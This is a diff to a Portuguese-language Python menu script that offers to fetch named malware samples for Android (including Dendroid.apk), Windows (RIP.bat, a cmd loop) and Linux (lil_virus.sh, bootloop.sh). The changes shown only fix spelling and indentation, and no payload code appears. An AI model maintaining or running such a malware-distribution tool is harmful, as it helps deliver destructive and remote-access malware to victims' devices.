@@ -37,7 +37,7 @@ def android():
     print('[9] vi4a.apk')
     print('[10] Grave.apk')
     print('[11] Dendroid.apk')
-    print('[00] Voltar ao menu princiapl')
+    print('[00] Voltar ao menu principal')
     print('[99] Sair')
     
     elegir2 = int(input('Selecione uma opcao:: '))
@@ -86,13 +86,13 @@ def android():
         os.system("mv 'dendroid.apk' Android/dendroid.apk")
         android()
     elif elegir2 == 00:
-          os.system("clear")
-          print(logo)
-          inicio()
+        os.system("clear")
+        print(logo)
+        inicio()
     elif elegir2 == 99:
-          exit()
+        exit()
     else:
-        print('Opcao invalidade tente novamente ')
+        print('Opcao invalida, tente novamente ')
         time.sleep(3)
         os.system("clear")
         print(logo)
@@ -100,7 +100,7 @@ def android():
         
 def windows():
     print(' ')
-    print('\nEscolha uma das opces abaixo: ')
+    print('\nEscolha uma das opcoes abaixo: ')
     print('[1] RansomwareFileDecryptor.exe')
     print('[2] Loop windows cmd')
     print('[3] RIP.bat')
@@ -156,7 +156,7 @@ def windows():
     elif elegir3 == 99:
         exit()
     else:
-        print('Error opcao invalida')
+        print('Opcao invalida')
         time.sleep(2)
         os.system("clear")
         print(logo)
@@ -164,7 +164,7 @@ def windows():
     
 def linux():
     print(' ')
-     print('\nEscolha uma das opces abaixo: ')
+    print('\nEscolha uma das opcoes abaixo: ')
     print('[1] freeze.sh')
     print('[2] lil_virus.sh')
     print('[3] bootloop.sh')
@@ -184,25 +184,25 @@ def linux():
         os.system("mv 'bootloop.sh' Linux/bootloop.sh")
         linux()
     elif elegir4 == 00:
-          os.system("clear")
-          print(logo)
-          inicio()
+        os.system("clear")
+        print(logo)
+        inicio()
     elif elegir4 == 99:
-          exit()
+        exit()
     else:
-          print('Error opcao invalida')
-          time.sleep(2)
-          os.system("clear")
-          print(logo)
-          linux()
+        print('Opcao invalida')
+        time.sleep(2)
+        os.system("clear")
+        print(logo)
+        linux()
         
 print(logo)
 def inicio():
-    print('\nEscolha uma das opces abaixo: ')
+    print('\nEscolha uma das opcoes abaixo: ')
     print('[1] Android')
     print('[2] Windows')
     print('[3] Linux')
-    print('[99] Sairr')
+    print('[99] Sair')
     elegir = int(input('Selecione um dos sistemas abaixo : '))
     if elegir == 1:
         android()
@@ -213,7 +213,7 @@ def inicio():
     elif elegir == 99:
        exit()
     else:
-       print('Error opcao invalida')
+       print('Opcao invalida')
        time.sleep(2)
        os.system("clear")
        print(logo)
